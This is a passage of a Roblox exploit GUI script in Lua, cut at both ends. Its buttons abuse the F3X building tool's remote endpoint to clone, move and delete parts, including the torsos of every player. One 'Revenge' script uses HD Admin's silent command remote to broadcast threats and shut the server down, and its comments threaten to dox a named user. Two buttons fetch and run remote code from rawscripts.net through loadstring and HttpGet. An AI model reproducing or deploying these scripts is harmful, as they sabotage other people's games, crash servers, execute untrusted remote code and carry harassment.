				end
			end
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = true
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
		
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = part
					},
					[3] = stringg
				}
		
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
		
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
			function Color(part,color)
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Color"] = color --[[Color3]],
							["UnionColoring"] = false
						}
					}
				}
				_(args)
			end
			function ClonePart(part)
				local args = {
					[1] = "Clone",
					[2] = {
						[1] = part
					},
					[3] = workspace
				}
		
				_(args)
			end
		
			function torsoclone(player)
				char = player.Character
				ClonePart(char.Torso)
			end
		
			for i,v in game.Players:GetPlayers() do
				--spawn(function()
				pcall(function()
					torsoclone(v)
				end)
				--end)
			end
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_1c);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_1e()
	local script = G2L["1e"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
		--[[
			WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
		]]
		--[[
		(==================================)
		( --★ Epik Skeleton Skybox F3X By ItsKittyyyGD ★--)
		(|==================================)
		(--★ SCRIPT CHANGELOGS: ★--)                                   )
		(-) Deleted create sky and destroy Now use Set texture. )
		(★) Smooth Skybox Video.                                             )
		(==================================)
		( I love you Blue2Spooky,Thanks for using my things.)
		(==================================)
		]]
			-- SOURCE
		
		
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local tool
		
			for i, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		
			for i, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		
			local remote = tool.SyncAPI.ServerEndpoint
			local RunService = game:GetService("RunService")
		
			function _(args)
				remote:InvokeServer(unpack(args))
			end
		
			function CreatePart(cf, parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
		
			function SetAnchor(part, boolean)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
		
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
		
			function SetMesh(part, meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://" .. meshid
						}
					}
				}
				_(args)
			end
		
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = texid
						}
					}
				}
				_(args)
			end
		
			function MeshResize(part, size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
		
			function SetTransparency(part, value)
				local args = {
					[1] = "SyncTransparency",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = value
						}
					}
				}
				_(args)
			end
		
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
		
			local images = {
				"http://www.roblox.com/asset/?id=14848893652",
				"http://www.roblox.com/asset/?id=15307205005",
				"http://www.roblox.com/asset/?id=14848893652",
				"http://www.roblox.com/asset/?id=15307205005",
				"http://www.roblox.com/asset/?id=14848893652",
				"http://www.roblox.com/asset/?id=15307205005",
				"http://www.roblox.com/asset/?id=14848893652",
				"http://www.roblox.com/asset/?id=15307205005"
			}
		
			local skyPart
			local skyLoop
			local frameTime = 1 / 10
			local lastUpdate = 0
		
			function CreateSky()
				local hrp = char:FindFirstChild("HumanoidRootPart")
				if not hrp then return end
		
				local cf = hrp.CFrame
				CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
		
				local found = false
				for i = 1, 50 do
					task.wait()
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
							skyPart = v
							found = true
							break
						end
					end
					if found then break end
				end
		
				if not skyPart then return end
		
				SetAnchor(skyPart, true)
				AddMesh(skyPart)
				SetMesh(skyPart, "111891702759441")
				MeshResize(skyPart, Vector3.new(8000, 8000, 8000))
				SetTransparency(skyPart, 0)
		
				local index = 1
				skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
					lastUpdate = lastUpdate + deltaTime
					if lastUpdate >= frameTime then
						lastUpdate = 0
						if not skyPart then
							skyLoop:Disconnect()
							return
						end
						SetTexture(skyPart, images[index])
						index = (index % #images) + 1
					end
				end)
			end
		
			function ResetSky()
				if skyLoop then
					skyLoop:Disconnect()
					skyLoop = nil
				end
				if skyPart then
					DestroyPart(skyPart)
					skyPart = nil
				end
				task.spawn(CreateSky)
			end
		
			player.CharacterAdded:Connect(function(newChar)
				char = newChar
				ResetSky()
			end)
		
			if char and char:FindFirstChild("Humanoid") then
				char:WaitForChild("Humanoid").Died:Connect(function()
					ResetSky()
				end)
			end
		
			CreateSky()
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_1e);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_20()
	local script = G2L["20"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			-- 1x1x1x1 Revenge By skyl0rd Messages Slient..So u wont get caught instantly~!
		
			--======
			---=====---==IIIIIIIIIIIIIIIIII>
			--======
		
			--Made by skyl0rd0sp00ky
			--aka skyl0rd because im not a larp of...
			--fucking b2s or that one fucking werido--===
			--if u have this dont give it to blue1sp00ky or ill
			--find u irl u dumbfuck 
			--ill leak u on doxbin
			---im fr
			--also this is the lua and dont look throught it..
			--its not because im a skid its just that..ugh nvm
			--so enjoy the script u private script fuck giver!
			--signed by skyl0rd
			--credits to n0wkidd for
			--idea
			--credits to windowsxsploits for existing
			--credits to gr0undl0rd my bff
			--credits to onginal 1x1x1x1 revenge script maker! hes unknown..
			--for now! ---skyl0rdBanned Signed Out!
			--wait up! one more thing XD
			--thanks elvr0x for just standing
			--=--=--=--=--=--=--=---=---=-=
			---====                   --==             --------D
			--====                   --=           -======-=====ID
			--=                    --=            - ___________ID
			--                   =--             - 
			--=                =-               -
			--==____________ =--               -
		
		
		
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
			RequestCommandSilent:InvokeServer(";sm 1x1x1x1:MUAHAHAHAHHAHAHAHHAH")
			RequestCommandSilent:InvokeServer(";sm 1x1x1x1:prepare for a the punishment becauce of me getting banned")
			RequestCommandSilent:InvokeServer(";sm 1x1x1x1:YOU WILL ALL PAY FOR ME BEING BANNED!")
			RequestCommandSilent:InvokeServer(";ServerHint 1x1x1x1 the server will end.")
			RequestCommandSilent:InvokeServer(";sm 1x1x1x1 is shutting it down the server.   MUAHAHAHAHHAHAHAHHAH.   Crashing in,")
		
			wait(1)
		
			RequestCommandSilent:InvokeServer(";sm 3,")
			RequestCommandSilent:InvokeServer(";sm 2,")
			RequestCommandSilent:InvokeServer(";sm 1,")
			RequestCommandSilent:InvokeServer(";shutdown 1x1x1x1 Has Ended The Server,")
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_20);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_22()
	local script = G2L["22"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			loadstring(game:HttpGet("https://rawscripts.net/raw/angelo776's-Place-shedletsky-86264"))()
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_22);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_24()
	local script = G2L["24"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			loadstring(game:HttpGet("https://rawscripts.net/raw/angelo776's-Place-HD-admin-ranker-f3x-85080"))()
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_24);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_26()
	local script = G2L["26"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
		--[[
			WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
		]]
			local p1 = Instance.new("ScreenGui")
			local ye = Instance.new("Frame")
			local e = Instance.new("ImageLabel")
			local ye_2 = Instance.new("ScrollingFrame")
			local r = Instance.new("TextLabel")
			local jeje = Instance.new("ImageLabel")
			local b = Instance.new("TextButton")
			local b_2 = Instance.new("TextButton")
			local b_3 = Instance.new("TextButton")
			local b_4 = Instance.new("TextButton")
			local b_5 = Instance.new("TextButton")
			local b_6 = Instance.new("TextButton")
			local b_7 = Instance.new("TextButton")
			local b_8 = Instance.new("TextButton")
			local b_9 = Instance.new("TextButton")
			local b_10 = Instance.new("TextButton")
			local b_11 = Instance.new("TextButton")
			local b_12 = Instance.new("TextButton")
			local jeje_2 = Instance.new("ImageLabel")
			local b_13 = Instance.new("TextButton")
			local b_14 = Instance.new("TextButton")
			local b_15 = Instance.new("TextButton")
			local b_16 = Instance.new("TextButton")
			local b_17 = Instance.new("TextButton")
			local b_18 = Instance.new("TextButton")
			local b_19 = Instance.new("TextButton")
			local b_20 = Instance.new("TextButton")
			local b_21 = Instance.new("TextButton")
			local b_22 = Instance.new("TextButton")
			local b_23 = Instance.new("TextButton")
			local b_24 = Instance.new("TextButton")
			local b_25 = Instance.new("TextButton")
			local b_26 = Instance.new("TextButton")
			local b_27 = Instance.new("TextButton")
			local b_28 = Instance.new("TextButton")
			local b_29 = Instance.new("TextButton")
			local b_30 = Instance.new("TextButton")
			local b_31 = Instance.new("TextButton")
			local b_32 = Instance.new("TextButton")
			local b_33 = Instance.new("TextButton")
			local jeje_3 = Instance.new("ImageLabel")
			local b_34 = Instance.new("TextButton")
			local b_35 = Instance.new("TextButton")
			local b_36 = Instance.new("TextButton")
			local b_37 = Instance.new("TextButton")
			local e_2 = Instance.new("TextButton")
			local e_3 = Instance.new("TextButton")
			local e_4 = Instance.new("TextButton")
			local e_5 = Instance.new("TextButton")
			local e_6 = Instance.new("TextButton")
			local e_7 = Instance.new("TextButton")
			local e_8 = Instance.new("TextButton")
			local e_9 = Instance.new("TextButton")
			local e_10 = Instance.new("TextButton")
			local e_11 = Instance.new("TextButton")
			local e_12 = Instance.new("TextButton")
			local e_13 = Instance.new("TextButton")
			local e_14 = Instance.new("TextButton")
			local e_15 = Instance.new("TextButton")
			local e_16 = Instance.new("TextButton")
			local e_17 = Instance.new("TextButton")
			local e_18 = Instance.new("TextButton")
			local e_19 = Instance.new("TextButton")
			local e_20 = Instance.new("TextButton")
			local e_21 = Instance.new("TextButton")
			local e_22 = Instance.new("TextButton")
			local e_23 = Instance.new("TextButton")
			local e_24 = Instance.new("TextButton")
			local e_25 = Instance.new("TextButton")
			local e_26 = Instance.new("TextButton")
			local e_27 = Instance.new("TextButton")
			local e_28 = Instance.new("TextButton")
			local e_29 = Instance.new("TextButton")
			local e_30 = Instance.new("TextButton")
			local e_31 = Instance.new("TextButton")
			local e_32 = Instance.new("TextButton")
			local e_33 = Instance.new("TextButton")
			local e_34 = Instance.new("TextButton")
			local e_35 = Instance.new("TextButton")
			local b_38 = Instance.new("TextButton")
			local b_39 = Instance.new("TextButton")
		
			--Properties:
		
			p1.Name = "p1"
			p1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
			p1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		
			ye.Name = "ye"
			ye.Parent = p1
			ye.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			ye.BorderColor3 = Color3.fromRGB(255, 0, 0)
			ye.BorderSizePixel = 5
			ye.Position = UDim2.new(0, 379, 0, 130)
			ye.Size = UDim2.new(0, 413, 0, 540)
		
			e.Name = "e"
			e.Parent = ye
			e.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			e.BorderColor3 = Color3.fromRGB(0, 0, 0)
			e.BorderSizePixel = 0
			e.Position = UDim2.new(0.0314769968, 0, 0.0166666675, 0)
			e.Size = UDim2.new(0, 387, 0, 521)
			e.Image = "rbxassetid://124621483096928"
			e.ImageTransparency = 0.370
		
			ye_2.Name = "ye"
			ye_2.Parent = e
			ye_2.Active = true
			ye_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ye_2.BackgroundTransparency = 1.000
			ye_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ye_2.BorderSizePixel = 0
			ye_2.Position = UDim2.new(-0.000814235769, 0, -0.00247409102, 0)
			ye_2.Size = UDim2.new(0, 387, 0, 522)
			ye_2.CanvasPosition = Vector2.new(0, 100)
		
			r.Name = "r"
			r.Parent = ye_2
			r.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			r.BackgroundTransparency = 1.000
			r.BorderColor3 = Color3.fromRGB(0, 0, 0)
			r.BorderSizePixel = 0
			r.Position = UDim2.new(0.176580697, 0, 0.000959692872, 0)
			r.Size = UDim2.new(0, 503, 0, 50)
			r.Font = Enum.Font.SourceSans
			r.Text = ""
			r.TextColor3 = Color3.fromRGB(255, 255, 255)
			r.TextScaled = true
			r.TextSize = 14.000
			r.TextWrapped = true
		
			jeje.Name = "jeje"
			jeje.Parent = r
			jeje.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			jeje.BackgroundTransparency = 1.000
			jeje.BorderColor3 = Color3.fromRGB(0, 0, 0)
			jeje.BorderSizePixel = 0
			jeje.Position = UDim2.new(-0.0258449297, 0, 0, 0)
			jeje.Size = UDim2.new(0, 278, 0, 50)
			jeje.Image = "rbxassetid://129275895571901"
		
			b.Name = "b"
			b.Parent = r
			b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b.Position = UDim2.new(-0.0810497701, 0, 7.05818462, 0)
			b.Size = UDim2.new(0, 98, 0, 29)
			b.Font = Enum.Font.Roboto
			b.Text = "Billboard all"
			b.TextColor3 = Color3.fromRGB(255, 255, 255)
			b.TextScaled = true
			b.TextSize = 14.000
			b.TextWrapped = true
		
			b_2.Name = "b"
			b_2.Parent = r
			b_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_2.Position = UDim2.new(0.841616571, 0, 3.47369266, 0)
			b_2.Size = UDim2.new(0, 98, 0, 29)
			b_2.Font = Enum.Font.Roboto
			b_2.Text = "NAME ALL"
			b_2.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_2.TextScaled = true
			b_2.TextSize = 14.000
			b_2.TextWrapped = true
		
			b_3.Name = "b"
			b_3.Parent = r
			b_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_3.Position = UDim2.new(0.374282032, 0, 8.81777477, 0)
			b_3.Size = UDim2.new(0, 98, 0, 29)
			b_3.Font = Enum.Font.Roboto
			b_3.Text = "Baby Giraffes"
			b_3.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_3.TextScaled = true
			b_3.TextSize = 14.000
			b_3.TextWrapped = true
		
			b_4.Name = "b"
			b_4.Parent = r
			b_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_4.Position = UDim2.new(0.370515913, 0, 4.30245113, 0)
			b_4.Size = UDim2.new(0, 98, 0, 29)
			b_4.Font = Enum.Font.Roboto
			b_4.Text = "REDGUI F3X V1 BETA"
			b_4.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_4.TextScaled = true
			b_4.TextSize = 14.000
			b_4.TextWrapped = true
		
			b_5.Name = "b"
			b_5.Parent = r
			b_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_5.Position = UDim2.new(0.378388852, 0, 5.19413185, 0)
			b_5.Size = UDim2.new(0, 98, 0, 29)
			b_5.Font = Enum.Font.Roboto
			b_5.Text = "nyan cat"
			b_5.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_5.TextScaled = true
			b_5.TextSize = 14.000
			b_5.TextWrapped = true
		
			b_6.Name = "b"
			b_6.Parent = r
			b_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_6.Position = UDim2.new(-0.0799144357, 0, 5.18183851, 0)
			b_6.Size = UDim2.new(0, 98, 0, 29)
			b_6.Font = Enum.Font.Roboto
			b_6.Text = "Transparent Character"
			b_6.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_6.TextScaled = true
			b_6.TextSize = 14.000
			b_6.TextWrapped = true
		
			b_7.Name = "b"
			b_7.Parent = r
			b_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_7.Position = UDim2.new(1.07793152, 0, 2.64067984, 0)
			b_7.Size = UDim2.new(0, 98, 0, 29)
			b_7.Font = Enum.Font.Roboto
			b_7.Text = "gold av."
			b_7.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_7.TextScaled = true
			b_7.TextSize = 14.000
			b_7.TextWrapped = true
		
			b_8.Name = "b"
			b_8.Parent = r
			b_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_8.Position = UDim2.new(-0.0834994912, 0, 1.81486082, 0)
			b_8.Size = UDim2.new(0, 98, 0, 29)
			b_8.Font = Enum.Font.Roboto
			b_8.Text = "Disco Character"
			b_8.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_8.TextScaled = true
			b_8.TextSize = 14.000
			b_8.TextWrapped = true
		
			b_9.Name = "b"
			b_9.Parent = r
			b_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_9.Position = UDim2.new(0.151014566, 0, 7.05999994, 0)
			b_9.Size = UDim2.new(0, 98, 0, 29)
			b_9.Font = Enum.Font.Roboto
			b_9.Text = "SPIN HEAD"
			b_9.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_9.TextScaled = true
			b_9.TextSize = 14.000
			b_9.TextWrapped = true
		
			b_10.Name = "b"
			b_10.Parent = r
			b_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_10.Position = UDim2.new(0.84027487, 0, 2.66957831, 0)
			b_10.Size = UDim2.new(0, 98, 0, 29)
			b_10.Font = Enum.Font.Roboto
			b_10.Text = "Baseplate"
			b_10.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_10.TextScaled = true
			b_10.TextSize = 14.000
			b_10.TextWrapped = true
		
			b_11.Name = "b"
			b_11.Parent = r
			b_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_11.Position = UDim2.new(0.845916331, 0, 5.19414902, 0)
			b_11.Size = UDim2.new(0, 98, 0, 29)
			b_11.Font = Enum.Font.Roboto
			b_11.Text = "Fire f3x"
			b_11.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_11.TextScaled = true
			b_11.TextSize = 14.000
			b_11.TextWrapped = true
		
			b_12.Name = "b"
			b_12.Parent = r
			b_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_12.Position = UDim2.new(0.150605276, 0, 5.19777346, 0)
			b_12.Size = UDim2.new(0, 98, 0, 29)
			b_12.Font = Enum.Font.Roboto
			b_12.Text = "funk"
			b_12.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_12.TextScaled = true
			b_12.TextSize = 14.000
			b_12.TextWrapped = true
		
			jeje_2.Name = "jeje"
			jeje_2.Parent = r
			jeje_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			jeje_2.BackgroundTransparency = 1.000
			jeje_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			jeje_2.BorderSizePixel = 0
			jeje_2.Position = UDim2.new(-0.0616302192, 0, 0.660000026, 0)
			jeje_2.Size = UDim2.new(0, 313, 0, 45)
			jeje_2.Image = "rbxassetid://113514712010253"
		
			b_13.Name = "b"
			b_13.Parent = r
			b_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_13.Position = UDim2.new(0.383601964, 0, 1.81015134, 0)
			b_13.Size = UDim2.new(0, 98, 0, 29)
			b_13.Font = Enum.Font.Roboto
			b_13.Text = "biggify"
			b_13.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_13.TextScaled = true
			b_13.TextSize = 14.000
			b_13.TextWrapped = true
		
			b_14.Name = "b"
			b_14.Parent = r
			b_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_14.Position = UDim2.new(-0.0845165849, 0, 7.9403944, 0)
			b_14.Size = UDim2.new(0, 98, 0, 29)
			b_14.Font = Enum.Font.Roboto
			b_14.Text = "fling all"
			b_14.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_14.TextScaled = true
			b_14.TextSize = 14.000
			b_14.TextWrapped = true
		
			b_15.Name = "b"
			b_15.Parent = r
			b_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_15.Position = UDim2.new(1.07834077, 0, 5.15199566, 0)
			b_15.Size = UDim2.new(0, 98, 0, 29)
			b_15.Font = Enum.Font.Roboto
			b_15.Text = "Skybox"
			b_15.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_15.TextScaled = true
			b_15.TextSize = 14.000
			b_15.TextWrapped = true
		
			b_16.Name = "b"
			b_16.Parent = r
			b_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_16.Position = UDim2.new(1.0791105, 0, 4.32771015, 0)
			b_16.Size = UDim2.new(0, 98, 0, 29)
			b_16.Font = Enum.Font.Roboto
			b_16.Text = "DecalSpam 2"
			b_16.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_16.TextScaled = true
			b_16.TextSize = 14.000
			b_16.TextWrapped = true
		
			b_17.Name = "b"
			b_17.Parent = r
			b_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_17.Position = UDim2.new(0.372220039, 0, 3.50293589, 0)
			b_17.Size = UDim2.new(0, 98, 0, 29)
			b_17.Font = Enum.Font.Roboto
			b_17.Text = "Duckify"
			b_17.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_17.TextScaled = true
			b_17.TextSize = 14.000
			b_17.TextWrapped = true
		
			b_18.Name = "b"
			b_18.Parent = r
			b_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_18.Position = UDim2.new(0.375256509, 0, 7.92390728, 0)
			b_18.Size = UDim2.new(0, 98, 0, 29)
			b_18.Font = Enum.Font.Roboto
			b_18.Text = "DecalSpam"
			b_18.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_18.TextScaled = true
			b_18.TextSize = 14.000
			b_18.TextWrapped = true
		
			b_19.Name = "b"
			b_19.Parent = r
			b_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_19.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_19.Position = UDim2.new(0.150605276, 0, 2.66957831, 0)
			b_19.Size = UDim2.new(0, 98, 0, 29)
			b_19.Font = Enum.Font.Roboto
			b_19.Text = "Disco"
			b_19.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_19.TextScaled = true
			b_19.TextSize = 14.000
			b_19.TextWrapped = true
		
			b_20.Name = "b"
			b_20.Parent = r
			b_20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_20.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_20.Position = UDim2.new(0.150830731, 0, 4.33002806, 0)
			b_20.Size = UDim2.new(0, 98, 0, 29)
			b_20.Font = Enum.Font.Roboto
			b_20.Text = "Hint"
			b_20.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_20.TextScaled = true
			b_20.TextSize = 14.000
			b_20.TextWrapped = true
		
			b_21.Name = "b"
			b_21.Parent = r
			b_21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_21.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_21.Position = UDim2.new(0.151014566, 0, 7.93665171, 0)
			b_21.Size = UDim2.new(0, 98, 0, 29)
			b_21.Font = Enum.Font.Roboto
			b_21.Text = "fly"
			b_21.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_21.TextScaled = true
			b_21.TextSize = 14.000
			b_21.TextWrapped = true
		
			b_22.Name = "b"
			b_22.Parent = r
			b_22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_22.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_22.Position = UDim2.new(1.0791105, 0, 3.52281117, 0)
			b_22.Size = UDim2.new(0, 98, 0, 29)
			b_22.Font = Enum.Font.Roboto
			b_22.Text = "Btools"
			b_22.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_22.TextScaled = true
			b_22.TextSize = 14.000
			b_22.TextWrapped = true
		
			b_23.Name = "b"
			b_23.Parent = r
			b_23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_23.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_23.Position = UDim2.new(0.153139994, 0, 3.50818539, 0)
			b_23.Size = UDim2.new(0, 98, 0, 29)
			b_23.Font = Enum.Font.Roboto
			b_23.Text = "billboard"
			b_23.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_23.TextScaled = true
			b_23.TextSize = 14.000
			b_23.TextWrapped = true
		
			b_24.Name = "b"
			b_24.Parent = r
			b_24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			b_24.BorderColor3 = Color3.fromRGB(255, 0, 0)
			b_24.Position = UDim2.new(0.378611863, 0, 2.63483024, 0)
			b_24.Size = UDim2.new(0, 98, 0, 29)
			b_24.Font = Enum.Font.Roboto
			b_24.Text = "r6 others"
			b_24.TextColor3 = Color3.fromRGB(255, 255, 255)
			b_24.TextScaled = true
			b_24.TextSize = 14.000
			b_24.TextWrapped = true
		
			b_25.Name = "b"
			b_25.Parent = r
			b_25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
